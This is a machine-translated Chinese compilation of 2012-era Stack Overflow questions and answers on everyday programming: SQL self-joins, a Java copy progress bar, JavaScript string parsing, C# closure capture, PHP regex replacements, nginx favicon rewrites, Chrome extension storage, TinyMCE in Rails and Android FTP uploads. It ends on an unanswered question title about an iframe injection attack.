现场演示：http: [//jsfiddle.net/satinder_singh1/TdAWY/](http://jsfiddle.net/satinder_singh1/TdAWY/)

演示内容 [http://jsfiddle.net/satinder_singh1/TdAWY/1/](http://jsfiddle.net/satinder_singh1/TdAWY/1/)

```
<div class="headDiv">
        <div class="c1 w1" >
            sd
        </div>
        <div class="c1 w20">s
        </div>
        <div class="c1 w5"> s
        </div>
        <div class="c1 w75">s
        </div>
         <div class="c1 w20">s
        </div>
        <div class="c1 w5"> s
        </div>
        <div class="c1 w75">s
        </div>

    </div>​

.c1
{
float:left;

}

.headDiv
{
width:100%;
border:1px soild blue;
}
.w75
{
width:75%;
height:50px;

border-bottom:1px solid;
}
.w20
{
width:20%;
height:50px;

border-bottom:1px solid;
}
.w5
{
width:5%;
height:50px;
background-color:Yellow;
border-bottom:1px solid;
}

.w1
{
width:100%;
height:50px;
background-color:pink;
border-bottom:1px solid;
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2015-05-06T17:48:10.413

使用[tabletodivconverter.com/](http://www.tabletodivconverter.com/)将 html 表格转换为 div。

# sql - 自加入以获取员工经理姓名

> ID：11427300
> 
> 赞同：10
> 
> 时间：2012-07-11T07:05:30.143
> 
> 标签：sql, sql-server, database, tsql

您好，我有一个包含以下列的员工表

```
Emp_id, Emp_Name and Mgr_id. 
```

我正在尝试创建一个将列出的视图

`Emp_id, Emp_name, Mgr_id and Mgr_name`（通过交叉连接 Employee 表）。我尝试了外部联接、内部联接等，但我无法正确处理。

非常感谢任何帮助。

```
CREATE TABLE [dbo].[tblEmployeeDetails](
[emp_id] [bigint] NOT NULL, 
[emp_name] [nvarchar](200) NULL,    
[emp_mgr_id] [bigint] NULL, CONSTRAINT [PK_tblEmployeeDetails] PRIMARY KEY CLUSTERED (
[emp_id] ASC )WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY] ) ON [PRIMARY] 
```

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-07-11T07:13:09.787

```
CREATE VIEW AS
SELECT e1.emp_Id EmployeeId, e1.emp_name EmployeeName, 
       e1.emp_mgr_id ManagerId, e2.emp_name AS ManagerName
FROM   tblEmployeeDetails e1
       JOIN tblEmployeeDetails e2
       ON e1.emp_mgr_id = e2.emp_id 
```

**编辑**：如果 emp_mgr_id 为空，Left Join 将起作用。

```
CREATE VIEW AS 
SELECT e1.emp_Id EmployeeId, e1.emp_name EmployeeName,  
       e1.emp_mgr_id ManagerId, e2.emp_name AS ManagerName 
FROM   tblEmployeeDetails e1 
       LEFT JOIN tblEmployeeDetails e2 
       ON e1.emp_mgr_id = e2.emp_id 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-07-11T07:11:00.843

```
 SELECT b.Emp_id, b.Emp_name,e.emp_id as managerID, e.emp_name as managerName
    FROM Employee b
    JOIN Employee e ON b.Emp_ID = e.emp_mgr_id 
```

试试这个，它本身就是一个 JOIN 来获得经理:)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2014-01-22T18:32:29.243

```
SELECT e1.empno EmployeeId, e1.ename EmployeeName, 
       e1.mgr ManagerId, e2.ename AS ManagerName
FROM   emp e1, emp e2
       where e1.mgr = e2.empno 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-07-11T07:26:15.037

```
CREATE VIEW EmployeeWithManager AS 
SELECT e.[emp id], e.[emp name], m.[emp id], m.[emp name] 
FROM Employee e LEFT JOIN Employee m ON e.[emp mgr id] = m.[emp id] 
```

此定义使用左外连接，这意味着即使经理 ID 为 NULL 或经理已被删除（如果您的应用程序允许）的员工也会被列出，他们的经理属性返回为 NULL。

如果您改为使用内部联接，则只会列出拥有经理的人员。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-07-11T07:13:59.697

正如杰西所说，使用自我加入：

```
SELECT 
  e.emp_id
  , e.emp_name
  , e.emp_mgr_id
  , m.emp_name AS mgr_name 
FROM [dbo].[tblEmployeeDetails] e 
LEFT JOIN [dbo].[tblEmployeeDetails] m ON e.emp_mgr_id = m.emp_id 
```

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2012-07-11T07:18:14.183

```
 select E1.emp_id [Emp_id],E1.emp_name [Emp_name],
E2.emp_mgr_id [Mgr_id],E2.emp_name [Mgr_name] 
from [tblEmployeeDetails] E1 left outer join
    [tblEmployeeDetails] E2
    on E1.emp_mgr_id=E2.emp_id 
```

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2012-07-11T07:18:48.900

试试这个。

```
SELECT Employee.emp_id, Employee.emp_name,Manager.emp_id as Mgr_Id, Manager.emp_name as Mgr_Name 
FROM tblEmployeeDetails Employee 
LEFT JOIN tblEmployeeDetails Manager ON Employee.emp_mgr_id = Manager.emp_id 
```

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2012-07-20T01:58:21.043

试试这个..你应该做`LEFT JOIN`的是忽略表中的空值

```
SELECT a.emp_Id EmployeeId, a.emp_name EmployeeName,  
       a.emp_mgr_id ManagerId, b.emp_name AS ManagerName 
FROM   tblEmployeeDetails a 
       LEFT JOIN tblEmployeeDetails b
       ON b.emp_mgr_id = b.emp_id 
```

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2014-09-04T14:53:02.540

```
TableName :Manager

EmpId   EmpName     ManagerId
1       Monib       4

2       zahir       1

3       Sarfudding  NULL

4       Aslam       3

select e.EmpId as EmployeeId,e.EmpName as EmployeeName,e.ManagerId as ManagerId,e1.EmpName as Managername from Manager e
  join manager e1 on e.ManagerId=e1.empId 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2016-08-26T16:00:01.400

```
create table abc(emp_ID int, manager varchar(20) , manager_id int)

emp_ID  manager manager_id
1       abc     NULL
2       def     1
3       ghi     2
4       klm     3
5       def1    1
6       ghi1    2
7       klm1    3

select a.emp_ID , a.manager emp_name,b.manager manager_name
from abc a
left join abc b
on a.manager_id = b.emp_ID

Result:
emp_ID  emp_name  manager_name
1       abc       NULL
2       def       abc
3       ghi       def
4       klm       ghi
5       def1      abc
6       ghi1      def
7       klm1      ghi 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2014-03-28T01:44:33.990

```
select E1.EmpId,E1.Name,E2.Name as Manager from Employee E1 left join Employee E2 on  E1.ManagerID = E2.EmpId 
```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2014-01-21T14:27:55.380

```
create view as 
(select 
e1.empno as PersonID,
e1.ename as PersonName,
e2.empno MANAGER_ID,
e2.ename MANAGER_NAME 
from 
employees e1 , employees e2 
where 
e2.empno=e1.mgr) 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2016-08-14T07:21:42.780

此外，您可能希望让经理和他们的报告计数 -

```
SELECT e2.ename ,count(e1.ename)  FROM employee_s e1 LEFT OUTER JOIN employee_s e2 
ON e1.manager_id = e2.eid
group by e2.ename; 
```

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2019-01-19T07:21:40.170

```
SELECT e1.emp_id, e1.emp_name, e1.mgr_id, e2.emp_name as manager_name

FROM employee e1

JOIN employee e2

ON e1.mgr_id = e2.emp_id

ORDER BY e1.emp_id 
```

*这是指向 SQL Fiddle 的链接以及一个工作示例。 [http://www.sqlfiddle.com/#!17/392b5/9](http://www.sqlfiddle.com/#!17/392b5/9)

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2022-02-08T12:06:05.113

```
select distinct( e1.id), e1.emp_name from employee as e1 
inner join employee as e2 on e1.id = e2.manager_id; 
```

# java - Apache FileUtils.copyDirectory(...) 的进度条

> ID：11427303
> 
> 赞同：5
> 
> 时间：2012-07-11T07:05:36.270
> 
> 标签：java, apache-commons, apache-commons-io, fileutils

有谁知道为 Apache 实现进度条的任何方法`FileUtils.copyDirectory(File src, File dst)`？我在[JavaDocs](http://commons.apache.org/io/api-release/org/apache/commons/io/FileUtils.html#copyDirectory%28java.io.File,%20java.io.File%29)和 API 中看不到任何有用的东西。似乎是处理批处理磁盘操作的常见用例，所以我不确定我是否遗漏了一些明显的东西。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-11T07:12:40.213

我想你必须自己做。我看到了这个直接的解决方案：

1.  找到您要复制的所有文件并首先计算文件数量或总文件大小（取决于您的进度条应该测量的内容）
2.  [`FileUtils.copyDirectory(File, File, FileFilter)`](http://commons.apache.org/io/api-release/org/apache/commons/io/FileUtils.html#copyDirectory%28java.io.File,%20java.io.File,%20java.io.FileFilter%29)使用并“滥用”`FileFilter`作为回调复制文件以将进度传达给进度条

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-08-30T03:57:34.393

对于任何感兴趣的人，我通过处理`doCopyFile`FileUtils 中的方法和导致它的几个方法来做到这一点。然后我将它们粘贴到一个新类中，以便我可以编辑这些方法，而不仅仅是使用固定的 FileUtils 方法。

然后我改变了这部分`doCopyFile`方法：

```
pos += output.transferFrom(input, pos, count); 
```

为此：（每次清空缓冲区时更新进度条，不是最好的方法）

```
//Split into into deceleration and assignment to count bytes transfered
long bytesTransfered = output.transferFrom(input, pos, count);
//complete original method
pos += bytesTransfered;
//update total bytes copied, so it can be used to calculate progress
bytesTransferedTotal += bytesTransfered;
//your code to update progress bar here
ProgressBar.setValue((int) Math.floor((100.0 / totalSize) * bytesTransferedTotal)); 
```

* * *

为了更好的方式复制将在不同的线程中运行，并且进度条将在 EDT 中更新（使用`bytesTransfered`正在复制的文件的值和总大小）：

```
long bytesTransfered = output.transferFrom(input, pos, count);
pos += bytesTransfered;
bytesTransferedTotal += bytesTransfered; 
```

然后使用以下内容更新 EDT 触发事件的进度条：

```
ProgressBar.setValue((int) Math.floor((100.0 / totalSizeOfFiles) * bytesTransferedTotal)); 
```

# javascript - Javascript：字符串到二维数组

> ID：11427304
> 
> 赞同：0
> 
> 时间：2012-07-11T07:05:43.893
> 
> 标签：javascript, ajax, arrays, string

我有一个 javascript 函数，它返回以下格式的字符串：

```
User,5
Group,6 
```

我希望将此字符串转换为如下所示的二维数组，知道如何实现吗？

```
[['user,5],['Group',6]] 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-11T07:13:56.203

您必须按换行符或空格分割并映射到用冒号分割：

```
str.split("\n").map(function(e) { return e.split(',') }); 
```

编辑：如果您希望第二个是整数，请使用 parseInt 进行转换：

```
str.split("\n").map(function(e) {
   var arr = e.split(',');
   arr[1] = parseInt(arr[1], 10);
   return arr;
}); 
```

注意，您必须为[不支持 ECMA Script 5](http://kangax.github.com/es5-compat-table/)的浏览器安装[地图](http://www.tutorialspoint.com/javascript/array_map.htm)以保持跨浏览器兼容性。您可以通过将其添加到您的代码来做到这一点

```
if (!('map' in Array.prototype)) {
  Array.prototype.map= function(mapper, that /*opt*/) {
    var other= new Array(this.length);
    for (var i= 0, n= this.length; i<n; i++)
        if (i in this)
            other[i]= mapper.call(that, this[i], i, this);
    return other;
  };
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:17:59.363

```
var myBigString= "  ";

var str1 =str.split("\n");
var myarr; 
for(var i=0;i<str1.length;i++) {
   var str2 =str.split(",");
      for(var j=0;j<str2.length;j++) {
            myarr[i] = str2[j]
       }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T07:10:26.080

之后使用逗号分隔字符串，例如

```
 VAR STR11="User,5";
 VAR STR22="GROUP,6";
    VAR STR=STR11.split(",");
     VAR STR1=STR22.split(",");
    var items = [[STR[0],STR[1]],[STR1[0],STR1[1]]]; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-11T07:18:04.847

尝试这个

```
function convert(s) {
  s.split("\n").map(function(s1){
    var splits = s1.split(",")
    splits[1] = parseInt(splits[1])
    return splits
  }
} 
```

*假设您从函数返回的字符串是 `"User,5\nGroup,6"`

# c# - 澳大利亚邮政追踪 API 集成

> ID：11427307
> 
> 赞同：0
> 
> 时间：2012-07-11T07:05:59.577
> 
> 标签：c#, asp.net

我们正在开发一个在线购物网站，我们使用澳大利亚邮政作为我们的运输方式。所以我们也在使用澳大利亚邮政的跟踪系统。

谁能告诉我如何集成澳大利亚邮政 API 进行跟踪？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T08:11:27.953

API 记录在这里：[交付选择技术规范](http://auspost.com.au/devcentre/assets/pdfs/delivery-choice-technical-specificationv234.pdf)

看起来您需要 API 密钥或澳大利亚邮政的用户帐户才能访问此功能。

绝大多数方法支持 XML/JSON 访问，其中一些使用 OAuth。您可以使用多种不同的方法从 .NET Framework 中调用这些方法；`HttpWebRequest`可能是最简单的。

# jquery - 自定义样式的 Google 地图控件

> ID：11427309
> 
> 赞同：4
> 
> 时间：2012-07-11T07:06:07.920
> 
> 标签：jquery, html, google-maps

我正在从事具有此要求的项目，但没有成功。

我需要的是这个：![在此处输入图像描述](../Images/fee2c7b41b77a5d4eb6337aaf2c639ba.png)

对于自定义标记，我关注了这个网站。[关联](http://powerhut.co.uk/googlemaps/custom_markers.php)

是否可以在 Google Map Api 中使用这些类型的自定义样式控件，如果可以，我该如何实现。我使用**自定义样式控件 Google Map**等术语搜索互联网，但没有成功。

请对此有所了解。提前致谢， Ankur

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:19:11.167

查看[Google Developers 文档](https://developers.google.com/maps/documentation/javascript/v2/controls?hl=nl-NL#Custom_Controls)。它向您展示了如何创建自定义控件。

# python - 用户注册到“https://api.parse.com/1/users”给出错误请求错误

> ID：11427310
> 
> 赞同：3
> 
> 时间：2012-07-11T07:06:10.217
> 
> 标签：python, django, urllib2

当我要在 parse.com 的用户表中发布用户数据时，我收到了错误的请求错误。这段代码有什么问题？任何帮助请。这是我的代码

```
 if form.is_valid(): # All validation rules pass
        username = form.cleaned_data['username']
        name = form.cleaned_data['name']
        password1 = form.cleaned_data['password1']
        password2 = form.cleaned_data['password2']
        email = form.cleaned_data['email']
        data = {"username": username, "name": name, "password": password1, "email": email}
        data = urllib.urlencode(data)
        url = settings.API_USER_ROOT
        http_verb = 'POST'
        request = urllib2.Request(url, data)
        request.add_header('Content-type', 'application/json')
        auth_header =  "Basic %s" % base64.b64encode('%s:%s' % (settings.APPLICATION_ID, settings.MASTER_KEY))
        request.add_header("Authorization", auth_header)
        request.get_method = lambda: http_verb
        try:
            print '***************'
            response = urllib2.urlopen(request)
            print '***********'
        except urllib2.URLError, e:
            print e.reason 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T08:50:02.517

导入httplib，json

```
connection = httplib.HTTPSConnection('api.parse.com', 443)
connection.connect()
connection.request('POST', '/1/users', json.dumps({
   "username": "cooldude6",
   "password": "p_n7!-e8",
   "phone": "415-392-0202"
 }), {
   "X-Parse-Application-Id": "APP ID",
   "X-Parse-REST-API-Key": "MASTER KEY",
   "Content-Type": "application/json"
 })
result = json.loads(connection.getresponse().read()) 
```

为了在 HTTPS 上发布使用端口 443

# c# - 线程、列表和循环不是一个好主意？

> ID：11427311
> 
> 赞同：2
> 
> 时间：2012-07-11T07:06:17.330
> 
> 标签：c#, multithreading, windows-phone-7, list

为了提高 WrapPanel 的性能，我在我的 WP7 应用程序中引入了线程。一个列表中有很长`List`的`Item`-objects，一个一个添加到另一个`List。我有以下两个列表：

```
public List<Item> OriginalItems;
public List<Item> CopyOfItems; 
```

放在`BackgroundWorker.DoWork`事件处理程序中的逻辑如下：

```
workerThread.DoWork += new DoWorkEventHandler((object sender, DoWorkEventArgs e) =>
{
    foreach (var item in OriginalItems)
    {
        Deployment.Current.Dispatcher.BeginInvoke(() =>
        {
            CopyOfItems.Add(item);
        });

        // I feel sooo sleepy
    }
}); 
```

现在，当我用 - 替换我的评论时，这工作得很好，`Thread.Sleep(150)`但任何更少的东西（偶尔甚至有更大的值）都会使代码连续多次放入同一个元素中。

为什么会这样，如何解决？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-11T07:10:37.767

这是 C# 中的一个已知问题 - 实际上是 C# 5 中修复的问题。当您从`foreach`lambda 表达式中的循环中捕获循环变量时，您正在捕获*一个变量*。该变量通过循环更改其值 - 因此，如果您在“原始”迭代完成后执行从 lambda 表达式创建的委托，您将看到来自“当前”迭代的值。

一个简单的解决方法是在循环中声明和初始化迭代变量的副本，并捕获它：

```
foreach (var item in OriginalItems)
{
    var copy = item;
    Deployment.Current.Dispatcher.BeginInvoke(() =>
    {
        CopyOfItems.Add(copy);
    });

    // I feel sooo sleepy
} 
```

有关这方面的更多详细信息，请参阅 Eric Lippert 的博客文章[“关闭被认为有害的循环变量”](http://blogs.msdn.com/b/ericlippert/archive/2009/11/12/closing-over-the-loop-variable-considered-harmful.aspx)。

顺便说一句，您的真实代码实际上在循环中做任何*工作吗？*目前尚不清楚您是否真的在使用线程来做任何重要的事情，而不是将 UI 线程工作分成几个块——这可以在没有`BackgroundWorker`.

# php - 使用 ereg_replace 及其替代品的副作用

> ID：11427315
> 
> 赞同：0
> 
> 时间：2012-07-11T07:06:38.537
> 
> 标签：php

我是 php 新手。我有以下代码：

```
$this->image["format"] = ereg_replace(".*\.(.*)$", "\\1", $imgfile);
$this->image["outputformat"] = ereg_replace(".*\.(.*)$", "\\1", $save); 
```

这工作正常，但我收到一个错误已弃用：函数 ereg_replace()。我想问一下在php中使用不推荐使用的函数是否有任何副作用？如果有其他替代品。我试过 preg 但它也不起作用。提前致谢 ：）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:08:57.517

使用不推荐使用的函数是不好的做法，您可以使用它们，但不建议这样做，因为它们不再受支持并且可能不会出现在更高版本的 php 中。

您应该使用[preg_replace](http://www.php.net/manual/en/function.preg-replace.php)而不是您的功能（我认为您已经尝试过，但请查看文档，也许您做错了什么）

编辑以回答评论中的问题：

您的替换将如下所示：

```
$this->image["format"] = preg_replace("/.*\.(.*)$/", "\\1", $imgfile);
$this->image["outputformat"] = preg_replace("/.*\.(.*)$/", "\\1", $save); 
```

请注意，模式以正斜杠开始和结束`/.*\.(.*)$/`

# ios - UIView 的触摸不被识别

> ID：11427320
> 
> 赞同：1
> 
> 时间：2012-07-11T07:06:45.407
> 
> 标签：ios, cocoa-touch, uiview, touchesbegan

我的班级`touchesBegan:`没有调用。是一个 UIView 子类，我将其添加为 的子视图，也是一个 UIView。是一个 UIScrollView 的子视图。这是在里面，一个 UIViewController。为了便于理解，这里有一个插图。`TextSelection``TextSelection``ReaderContentPage``ReaderContentPage``ReaderContentView``ReaderContentView``ReaderViewController`

![在此处输入图像描述](../Images/714e47afcf23c68e871b1ac53b65e56e.png)

现在我的问题是这个。`touchesBegan:`并且`touchesMoved:`在 TextSelect 中无法识别。我启用了 userInteraction，使用了 UIPanGestureRecognizer，但这些都不起作用。现在，当我尝试这样做时：`[self.ReadContView addSubView:txtSel]`而不是 this `[self.ReadContView.ReadContPage addSubView:txtSel]`，触摸被识别。但是由于某种原因，我必须将它添加到 ReaderContentPage 而不是 ReaderContentView 中。那么，当我在 ReaderContentPage 中添加 TextSelect 时，任何人都可以向我解释为什么`touchesBegan`并没有被调用吗？`touchesMoved`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T08:17:09.600

UIImageView 上默认禁用 UserInteraction，您的 readContentPage 中有 UIImageView 吗？

# flash - 为 Flash 配置 Fiddler2

> ID：11427321
> 
> 赞同：1
> 
> 时间：2012-07-11T07:06:45.613
> 
> 标签：flash, httpwebrequest, fiddler

Fiddler2 不记录通过 Flash 应用程序发出的请求。它是在wireshark中提取的，但是wireshark不提供简单的界面和格式化的内容。

如何配置 Fiddler2 以记录 Flash 应用程序发出的请求？

# php - 如何在数组php中循环遍历json数组

> ID：11427329
> 
> 赞同：0
> 
> 时间：2012-07-11T07:07:15.497
> 
> 标签：php, arrays, json

我需要帮助遍历数组中的数组，我只需要遍历某些数组，例如，我将如何遍历名称数组？

```
Array
(
    [@total_records] => 10
    [@total_matching_records] => 10
    [@available_records] => 200
    [@available_matching_records] => 12
    [query] => Array
        (
            [summary] => Array
                (
                    [emails] => Array
                        (
                            [0] => Array
                                (
                                    [content] => jonathan.lyon@gmail.com
                                )

                        )

                )

        )

    [results] => Array
        (
            [person] => Array
                (
                    [@match_score] => 1
                    [summary] => Array
                        (
                            [names] => Array
                                (
                                    [0] => Array
                                        (
                                            [first] => Jonathan
                                            [last] => Lyon
                                            [display] => Jonathan Lyon
                                        )
                                    [1] => Array
                                        (
                                            [first] => Jonathan
                                            [last] => Jordan
                                            [display] => Jonathan Jordan
                                        )
                                ) 
```

我已经尝试过了，但无法让它工作：-

```
foreach($json_output['results']['person']['summary']['names'] as $key => $val) {
echo $key.": ".$val."</br>";
} 
```

任何帮助将不胜感激。

谢谢

乔纳森

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:17:16.330

你试过这个

```
foreach($json_output['results']['person']['summary']['names'] as $key => $val) {
    echo $key.": ".$val['display']."</br>";
} 
```

?

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:19:22.947

在您的示例中，您尝试`echo $key`. 您的情况的关键`$key`是数组索引（整数）。你确定你真的需要那个吗？

您需要将代码更改为：

```
foreach($json_output['results']['person']['summary']['names'] as $val) {
    echo $val['display']."</br>";
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T07:16:19.893

您是否收到任何错误输出？那会有很大帮助。我还可以看到在这种情况下 $val 是一个数组，所以你不想回应它。

# nginx - 使用 nginx，如何将请求重写到不同的目录？

> ID：11427331
> 
> 赞同：1
> 
> 时间：2012-07-11T07:07:19.053
> 
> 标签：nginx, rewrite

在现场，`favicon.ico`保存在`/images/`目录中，而不是根目录中。我怎么告诉`nginx`看那里？

已经尝试过 - 看起来正确但不起作用：

```
location = /favicon.ico$ { rewrite /(.*) /images/$1 last; } 
```

返回`404 Not Found`

文件在那里：请求`http://www.example.com/images/favicon.ico`成功

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-11T12:27:56.217

```
location = /favicon.ico {
    root /path/to/your/images;
} 
```

*   [http://nginx.org/en/docs/http/request_processing.html](http://nginx.org/en/docs/http/request_processing.html)
*   [http://nginx.org/en/docs/http/converting_rewrite_rules.html](http://nginx.org/en/docs/http/converting_rewrite_rules.html)
*   [http://nginx.org/r/location](http://nginx.org/r/location)
*   [http://nginx.org/r/root](http://nginx.org/r/root)
*   [http://nginx.org/r/alias](http://nginx.org/r/alias)
*   [http://wiki.nginx.org/Pitfalls](http://wiki.nginx.org/Pitfalls)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-09-19T05:39:44.400

我们也可以通过重写来解决这个问题。（我必须使用重写来解决它，因为我使用的是`try_files`指令。）

这是我的配置：

```
# Long cache times for static content
location ~ /_/static/(.+)$  {
    # hold the last five versions of our static content
    try_files
        /_/static_477526f-master/$1
        /_/static_05c8613-release/$1
        /_/static_05c8613-master/$1
        /_/static_db26497-release/$1
        /_/static_db26497-master/$1;
    expires  365d;
    add_header Cache-Control public;
    add_header Access-Control-Allow-Origin *;
}

location = /favicon.ico {
    rewrite . /_/static/favicon.ico;
    expires  14d;
    add_header Cache-Control public;
} 
```

正`.`则表达式匹配任何内容，第二个条目重写 url。由于这是一个特定于网站图标的位置，我们可以只对其进行硬编码，而不是使用正则表达式捕获和`$1`.

# google-chrome - Chrome 扩展的 LocalStorage 同步是否已经可用？

> ID：11427340
> 
> 赞同：0
> 
> 时间：2012-07-11T07:07:50.430
> 
> 标签：google-chrome, google-chrome-extension, synchronization, local-storage, sync

我发现标题为*“允许扩展程序/应用程序同步自己的设置”的*[chromium 问题](http://code.google.com/p/chromium/issues/detail?id=47327)，其状态为“已**修复**”。它是从 2011 年 12 月开始的。那么，它有效吗？如果是这样，它是如何工作的，文档在哪里？

 ***上次[类似的问题](https://stackoverflow.com/questions/4213882/how-to-sync-chrome-extension-options)是在 2010 年提出的，然后答案是使用书签黑客。我认为是时候更新这个话题了。

**更新**：我刚刚找到了[这些](http://code.google.com/chrome/extensions/dev/storage.html)实验`chrome.storage`API 文档。这就是我要找的吗？`chrome.storage`在稳定之前，我们是否有任何新的替代品（除了书签） ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T08:53:46.780

*   `chrome.experimental.storage`在 Chrome 18 中作为实验性 API 引入。
*   在 Chrome 19 中，API 仅限于 Dev 通道。
*   自 Chrome 20 起，API 不再是实验性的^([Docs](http://code.google.com/chrome/extensions/storage.html)) ^(| [例子](http://code.google.com/chrome/extensions/storage.html#examples))。

要使用 API，需要清单版本 2。这是使扩展程序在 Chrome 20+ 中工作的最小清单文件：

```
{
  "name": "test",
  "version": "1",
  "manifest_version": 2,
  "permissions": ["storage"]
} 
```***

# ruby-on-rails-3.1 - 用于 Rails 3.1 的 TinyMCE

> ID：11427342
> 
> 赞同：0
> 
> 时间：2012-07-11T07:07:59.250
> 
> 标签：ruby-on-rails-3.1, tinymce, static-pages

在显示页面中，我将字符串转换为哈希，

form.html.erb

```
<%= f.text_area :content, :rows => 20, :cols => 120 %>

<script type="text/javascript">
$(function() {
$('textarea').tinymce({
  theme: 'advanced'
});
});
</script> 
```

显示.html.erb

```
<p>
<%= @page.content %>
</p>
<p>
<%= link_to "Edit", editcontent_path(@page), :class => "abutton" %> |
<%= link_to "Destroy", destroycontent_path(@page), :confirm => 'Are you sure?', :method => :delete %> |
<%= link_to "View All", admins_view_content_path %>
</p> 
```

但我的页面如下，代码没有转换

![代码不转换](../Images/5400ed820caa3e518dcd3c59c65c04c5.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T08:16:49.740

我没有使用 tinymce ，但根据文档，我理解的是

如果要将内容添加到编辑器，请将其传递到文本区域

```
<%= text_area_tag :editor, @page.content , :class => "tinymce", :rows => 40, :cols => 120 %>

# you can pass configuration option to tinymce here
<%= tinymce %> 
```

在显示页面

```
<p>
<%= @page.content.html_safe %> #Apply html_safe function to interpret string as html
</p> 
```

这对我有用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-12T08:52:01.287

可选 raw(@page.content) 也可以

# java - 无法在 android 的 FTP 服务器上上传文件

> ID：11427346
> 
> 赞同：0
> 
> 时间：2012-07-11T07:08:19.810
> 
> 标签：java, android, ftp

我正在尝试像这样上传文件

```
try {
    String extStorageDirectory = Environment.getExternalStorageDirectory().toString
    FTPClient ftpClient = new FTPClient();
    ftpClient.connect("xxx.xxx.xx.xx");
    if (FTPReply.isPositiveCompletion(ftpClient.getReplyCode()))
    {
      boolean status=ftpClient.login("username", "password");
      Log.d(TAG, "login status=="+status);
      status=ftpClient.changeWorkingDirectory("New directory");
      Log.d(TAG, "changeWorkingDirectory status=="+status);
      status=ftpClient.setFileType(FTP.BINARY_FILE_TYPE);
      Log.d(TAG, "setFileType status=="+status);
      ftpClient.enterLocalPassiveMode();
      String srcFilePath=extStorageDirectory + "/AA.txt";
     FileInputStream srcFileStream = new FileInputStream(new File(srcFilePath));
     status=ftpClient.storeFile("AA.txt", srcFileStream);
     Log.d(TAG, "upload status=="+status);  
      ftpClient.logout();
    ftpClient.disconnect();
            }
            else
            {
                Log.d(TAG, "connectfail");
            }

        } catch (SocketException e) {
            Log.d(TAG, "SocketException status=="+e.toString());
            e.printStackTrace();
        } catch (FileNotFoundException e) {
            Log.d(TAG, "FileNotFoundException status=="+e.toString());
            e.printStackTrace();
        } catch (IOException e) {
            Log.d(TAG, "IOException status=="+e.toString());
            e.printStackTrace();
        } 
```

以下是我的 logcat 状态

```
07-11 12:24:43.359: D/FTPDownloadDroid(10647): <!>com.ss.dr 138<!> login status==true
07-11 12:24:48.379: D/FTPDownloadDroid(10647): <!>com.ss.dr 141<!> changeWorkingDirectory status==true
07-11 12:24:48.859: D/FTPDownloadDroid(10647): <!>com.ss.dr 143<!> setFileType status==tr
07-11 12:24:54.359: D/FTPDownloadDroid(10647): <!>com.ss.dr 150<!> upload status==false 
```

我想在**“新目录**”文件夹和文件名**AA.txt**上上传文件** 但它给出的**上传状态为假**。**

问题出在服务器还是在我的代码中？？？请帮忙！！！！！！！！！提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:38:20.553

试试下面的代码，我用它**在服务器上上传和下载一首歌曲**。我正在使用 Apache 的公共库。

**请在以下代码中更改目录和文件名。**

**上传：**

```
public void goforIt(){

        FTPClient con = null;

        try
        {
            con = new FTPClient();
            con.connect("192.168.2.57");

            if (con.login("Administrator", "KUjWbk"))
            {
                con.enterLocalPassiveMode(); // important!
                con.setFileType(FTP.BINARY_FILE_TYPE);
                String data = "/sdcard/vivekm4a.m4a";

                FileInputStream in = new FileInputStream(new File(data));
                boolean result = con.storeFile("/vivekm4a.m4a", in);
                in.close();
                if (result) Log.v("upload result", "succeeded");
                con.logout();
                con.disconnect();
            }
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }

    } 
```

**下载：**

```
public void goforIt(){
    FTPClient con = null;

    try
    {
        con = new FTPClient();
        con.connect("192.168.2.57");

        if (con.login("Administrator", "KUjWbk"))
        {
            con.enterLocalPassiveMode(); // important!
            con.setFileType(FTP.BINARY_FILE_TYPE);
            String data = "/sdcard/vivekm4a.m4a";

            OutputStream out = new FileOutputStream(new File(data));
            boolean result = con.retrieveFile("vivekm4a.m4a", out);
            out.close();
            if (result) Log.v("download result", "succeeded");
            con.logout();
            con.disconnect();
        }
    }
    catch (Exception e)
    {
        Log.v("download result","failed");
        e.printStackTrace();
    }

} 
```

# php - 网站 iframe 攻击 - 将代码插入源代码

> ID：11427349
> 
> 赞同：6
> 
> 时间：2012-07-11T07:08:29.580
> 
